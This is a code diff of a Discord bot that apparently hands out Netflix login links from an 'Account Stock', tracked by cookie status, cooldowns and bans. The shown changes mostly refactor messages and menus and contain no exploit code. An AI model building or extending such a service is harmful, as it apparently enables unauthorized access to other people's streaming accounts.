         should_delete = _cookie_info_is_confirmed_inactive(info)
         if chosen_file_name:
             exclude_names.add(chosen_file_name)
@@ -2404,7 +2536,7 @@ class RetryView(discord.ui.View):
         )
         view = LanguageSelectView(interaction)
         await interaction.followup.send(
-            TRANSLATIONS["en"]["lang_prompt"], view=view, ephemeral=True
+            TRANSLATIONS["ar"]["lang_prompt"], view=view, ephemeral=True
         )
         self.stop()
 
@@ -2579,38 +2711,7 @@ class DeviceSelectView(discord.ui.View):
 
 @bot.tree.command(name="create", description="🎬 Generate a Netflix login link (PC, Phone, or TV)")
 async def create(interaction: discord.Interaction) -> None:
-    user_lang = get_user_lang(interaction)
-
-    if not is_allowed_channel(interaction):
-        guild_id = interaction.guild.id if interaction.guild else None
-        channel_id = config.get_channel_for_guild(guild_id) if guild_id else None
-        if channel_id is None:
-            await interaction.response.send_message(
-                TRANSLATIONS[user_lang]["wrong_channel_no_config"], ephemeral=True
-            )
-        else:
-            allowed_channel = bot.get_channel(channel_id)
-            mention = allowed_channel.mention if allowed_channel else "the designated channel"
-            await interaction.response.send_message(
-                TRANSLATIONS[user_lang]["wrong_channel_with_config"].format(channel=mention), ephemeral=True
-            )
-        return
-
-    on_cooldown, remaining_hours = await asyncio.to_thread(check_user_cooldown, interaction.user.id)
-    if on_cooldown:
-        total_minutes = int(remaining_hours * 60)
-        hours_left = total_minutes // 60
-        minutes_left = total_minutes % 60
-        msg = TRANSLATIONS[user_lang]["cooldown"].format(hours=hours_left, minutes=minutes_left)
-        await interaction.response.send_message(msg, ephemeral=True)
-        log.info(
-            f"Cooldown: {interaction.user} (ID: {interaction.user.id}) "
-            f"blocked – {hours_left}h {minutes_left}m remaining"
-        )
-        return
-
-    view = LanguageSelectView(interaction)
-    await interaction.response.send_message(TRANSLATIONS["en"]["lang_prompt"], view=view, ephemeral=True)
+    await _start_create_flow(interaction)
 
 @bot.tree.command(
     name="channel",
@@ -2626,11 +2727,7 @@ async def set_channel(interaction: discord.Interaction, channel: discord.TextCha
     guild_id = interaction.guild.id
     guild_name = interaction.guild.name if interaction.guild else "Unknown"
     await config.set_allowed_channel(guild_id, channel.id, guild_name=guild_name, channel_name=channel.name)
-    msg = (
-        f"✅ Bot will now **only** respond in {channel.mention}."
-        if lang == "en"
-        else f"\u200f✅ البوت سيعمل الآن **فقط** في {channel.mention}."
-    )
+    msg = f"✅ Bot will now **only** respond in {channel.mention}."
     await interaction.followup.send(msg, ephemeral=True)
     await send_or_update_setup_messages(channel, guild_id)
     log.info(f"/channel set by {interaction.user} in guild {guild_id} → #{channel.name}")
@@ -2682,17 +2779,9 @@ async def ban_user(interaction: discord.Interaction, user_id: str) -> None:
     success = await asyncio.to_thread(add_ban_to_github, uid, username)
     if success:
         log.info(f"Admin {interaction.user} banned {username} (ID: {uid})")
-        msg = (
-            f"✅ User `{username}` (ID: `{uid}`) has been **banned**."
-            if lang == "en"
-            else f"\u200f✅ تم حظر المستخدم `{username}` (ID: `{uid}`)."
-        )
+        msg = f"✅ User `{username}` (ID: `{uid}`) has been **banned**."
     else:
-        msg = (
-            f"⚠️ User `{uid}` banned locally but **GitHub push failed**."
-            if lang == "en"
-            else f"\u200f⚠️ تم الحظر محليًا لكن **فشل الرفع إلى GitHub**."
-        )
+        msg = f"⚠️ User `{uid}` banned locally but **GitHub push failed**."
     await interaction.followup.send(msg, ephemeral=True)
 
 @bot.tree.command(name="unban", description="✅ Remove a bot ban for a user by their Discord ID (Admin only)")
@@ -2716,17 +2805,9 @@ async def unban_user(interaction: discord.Interaction, user_id: str) -> None:
     success = await asyncio.to_thread(remove_ban_from_github, uid)
     if success:
         log.info(f"Admin {interaction.user} unbanned user {uid} (had {attempts} attempt(s))")
-        msg = (
-            f"✅ User `{uid}` has been **unbanned**. They had **{attempts}** blocked attempt(s)."
-            if lang == "en"
-            else f"\u200f✅ تم رفع الحظر عن المستخدم `{uid}`. كان لديه **{attempts}** محاولة محظورة."
-        )
+        msg = f"✅ User `{uid}` has been **unbanned**. They had **{attempts}** blocked attempt(s)."
     else:
-        msg = (
-            f"⚠️ User `{uid}` unbanned locally but **GitHub push failed**."
-            if lang == "en"
-            else f"\u200f⚠️ تم رفع الحظر محليًا لكن **فشل الرفع إلى GitHub**."
-        )
+        msg = f"⚠️ User `{uid}` unbanned locally but **GitHub push failed**."
     await interaction.followup.send(msg, ephemeral=True)
 
 @bot.tree.command(
@@ -2763,17 +2844,9 @@ async def ban_server(
     success = await asyncio.to_thread(add_server_ban_to_github, gid, guild_name, reason)
     if success:
         log.info(f"Admin {interaction.user} banned server '{guild_name}' (ID: {gid}) – reason: {reason}")
-        msg = (
-            f"✅ Server `{guild_name}` (ID: `{gid}`) has been **banned**.\n📋 Reason: {reason}"
-            if lang == "en"
-            else f"\u200f✅ تم حظر السيرفر `{guild_name}` (ID: `{gid}`).\n📋 السبب: {reason}"
-        )
+        msg = f"✅ Server `{guild_name}` (ID: `{gid}`) has been **banned**.\n📋 Reason: {reason}"
     else:
-        msg = (
-            f"⚠️ Server `{gid}` banned locally but **GitHub push failed**."
-            if lang == "en"
-            else f"\u200f⚠️ تم الحظر محليًا لكن **فشل الرفع إلى GitHub**."
-        )
+        msg = f"⚠️ Server `{gid}` banned locally but **GitHub push failed**."
     await interaction.followup.send(msg, ephemeral=True)
 
 @bot.tree.command(
@@ -2799,17 +2872,9 @@ async def unban_server(interaction: discord.Interaction, guild_id: str) -> None:
     success = await asyncio.to_thread(remove_server_ban_from_github, gid)
     if success:
         log.info(f"Admin {interaction.user} unbanned server {gid}")
-        msg = (
-            f"✅ Server `{gid}` has been **unbanned**."
-            if lang == "en"
-            else f"\u200f✅ تم رفع الحظر عن السيرفر `{gid}`."
-        )
+        msg = f"✅ Server `{gid}` has been **unbanned**."
     else:
-        msg = (
-            f"⚠️ Server `{gid}` unbanned locally but **GitHub push failed**."
-            if lang == "en"
-            else f"\u200f⚠️ تم رفع الحظر محليًا لكن **فشل الرفع إلى GitHub**."
-        )
+        msg = f"⚠️ Server `{gid}` unbanned locally but **GitHub push failed**."
     await interaction.followup.send(msg, ephemeral=True)
 
 admin_group = app_commands.Group(
@@ -2847,15 +2912,10 @@ async def admin_add(interaction: discord.Interaction, user_id: str) -> None:
     }
     success = await asyncio.to_thread(save_admins_to_github, _admin_registry)
     log.info(f"Owner {interaction.user} added admin {username} (ID: {uid})")
-    msg = (
-        f"✅ `{username}` (ID: `{uid}`) has been added as a **bot admin**."
-        if lang == "en"
-        else f"\u200f✅ تمت إضافة `{username}` (ID: `{uid}`) كـ **مسؤول بوت**."
-    ) if success else (
-        f"✅ `{uid}` added locally but **GitHub push failed**."
-        if lang == "en"
-        else f"\u200f✅ تمت الإضافة محليًا لكن **فشل الرفع إلى GitHub**."
-    )
+    if success:
+        msg = f"✅ `{username}` (ID: `{uid}`) has been added as a **bot admin**."
+    else:
+        msg = f"✅ `{uid}` added locally but **GitHub push failed**."
     await interaction.followup.send(msg, ephemeral=True)
 
 @admin_group.command(name="remove", description="👮 Remove a user from the bot admin list")
@@ -2881,15 +2941,10 @@ async def admin_remove(interaction: discord.Interaction, user_id: str) -> None:
     removed_info = _admin_registry.pop(uid)
     success = await asyncio.to_thread(save_admins_to_github, _admin_registry)
     log.info(f"{interaction.user} removed admin {removed_info['username']} (ID: {uid})")
-    msg = (
-        f"✅ `{removed_info['username']}` (ID: `{uid}`) has been **removed** from admins."
-        if lang == "en"
-        else f"\u200f✅ تمت إزالة `{removed_info['username']}` (ID: `{uid}`) من المسؤولين."
-    ) if success else (
-        f"✅ `{uid}` removed locally but **GitHub push failed**."
-        if lang == "en"
-        else f"\u200f✅ تمت الإزالة محليًا لكن **فشل الرفع إلى GitHub**."
-    )
+    if success:
+        msg = f"✅ `{removed_info['username']}` (ID: `{uid}`) has been **removed** from admins."
+    else:
+        msg = f"✅ `{uid}` removed locally but **GitHub push failed**."
     await interaction.followup.send(msg, ephemeral=True)
 
 @admin_group.command(name="list", description="👮 List all current bot admins")
@@ -2899,8 +2954,8 @@ async def admin_list(interaction: discord.Interaction) -> None:
         await interaction.response.send_message(TRANSLATIONS[lang]["not_admin"], ephemeral=True)
         return
     embed = discord.Embed(
-        title="👮 Bot Admin List  |  قائمة المسؤولين",
-        color=discord.Color.gold(),
+        title="👮 Bot Admin List",
+        color=NETFLIX_RED,
         timestamp=datetime.now(EGYPT_TZ),
     )
     embed.add_field(
@@ -2930,7 +2985,7 @@ bot.tree.add_command(admin_group)
 
 @bot.tree.command(
     name="stock",
-    description="📊 Refresh the Account Stock embed in the bot channel (Admin only)",
+    description="📊 Refresh the main message in the bot channel (Admin only)",
 )
 async def stock_refresh(interaction: discord.Interaction) -> None:
     lang = get_user_lang(interaction)
@@ -2945,11 +3000,7 @@ async def stock_refresh(interaction: discord.Interaction) -> None:
         return
     await interaction.response.defer(ephemeral=True)
     await _refresh_stats_message(guild_id)
-    msg = (
-        "✅ Account Stock message has been refreshed."
-        if lang == "en"
-        else "\u200f✅ تم تحديث رسالة مخزون الحسابات."
-    )
+    msg = "✅ Main message has been refreshed."
     await interaction.followup.send(msg, ephemeral=True)
     log.info(f"/stock used by {interaction.user} in guild {guild_id}")
 
@@ -2973,11 +3024,7 @@ async def global_interaction_check(interaction: discord.Interaction) -> bool:
     if is_user_banned(interaction.user.id):
         attempts = record_ban_attempt(interaction.user.id)
         lang = get_user_lang(interaction)
-        msg = (
-            f"🚫 You have been banned from using this bot. (Attempt #{attempts})"
-            if lang == "en"
-            else f"\u200f🚫 تم حظرك من استخدام هذا البوت. (المحاولة رقم #{attempts})"
-        )
+        msg = f"🚫 You have been banned from using this bot. (Attempt #{attempts})"
         cmd_name = interaction.command.name if interaction.command else "?"
         log.warning(f"Banned user {interaction.user} tried /{cmd_name} – attempt #{attempts}")
         if interaction.response.is_done():
@@ -2989,11 +3036,7 @@ async def global_interaction_check(interaction: discord.Interaction) -> bool:
     guild_id = interaction.guild.id if interaction.guild else None
     if guild_id and is_server_banned(guild_id):
         lang = get_user_lang(interaction)
-        msg = (
-            "🚫 This server has been banned from using this bot due to a violation of the bot rules."
-            if lang == "en"
-            else "\u200f🚫 تم حظر هذا السيرفر من استخدام البوت بسبب انتهاك قواعد الاستخدام."
-        )
+        msg = "🚫 This server has been banned from using this bot due to a violation of the bot rules."
         cmd_name = interaction.command.name if interaction.command else "?"
         log.warning(f"Banned guild {guild_id} tried /{cmd_name} via {interaction.user}")
         if interaction.response.is_done():
@@ -3017,6 +3060,7 @@ async def global_interaction_check(interaction: discord.Interaction) -> bool:
 async def on_ready() -> None:
     log.info("━" * 60)
     log.info(f"Logged in as : {bot.user}  (ID: {bot.user.id})")
+    log.info(f"Bot version  : {BOT_VERSION}")
     if ALLOWED_GUILD_IDS:
         log.info(f"Guild restriction : {ALLOWED_GUILD_IDS}")
     else:
@@ -3047,6 +3091,12 @@ async def on_ready() -> None:
     log.info(f"Admin list: {len(_admin_registry)} admin(s)")
 
     _load_setup_tracker()
+
+    try:
+        bot.add_view(MainMenuView())
+        log.info("Registered persistent MainMenuView")
+    except Exception as exc:
+        log.warning(f"Could not register persistent MainMenuView: {exc}")
 
     if ALLOWED_GUILD_IDS:
         for gid in ALLOWED_GUILD_IDS:
